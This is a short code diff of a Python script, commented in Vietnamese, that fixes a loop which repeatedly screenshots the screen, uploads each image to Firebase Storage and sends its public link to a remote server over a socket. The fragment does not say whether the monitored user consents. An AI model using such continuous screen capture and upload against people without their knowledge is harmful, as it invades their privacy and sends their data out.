@@ -24,14 +24,14 @@ while True:
         screenshot = pyautogui.screenshot()
         now = datetime.now()
         nameScreen = "screenshot"+ now.strftime("%H%M%S") +".png"
+        screenshot.save(nameScreen)
 
         # Lưu ảnh vào Firebase Storage
         bucket = storage.bucket()
         blob = bucket.blob(nameScreen)
-        blob.upload_from_file(nameScreen)
+        blob.upload_from_filename(nameScreen)
 
         # Gửi link ảnh đến server
         link = blob.public_url
         client_socket.send(link.encode('utf-8'))
-
 client_socket.close()
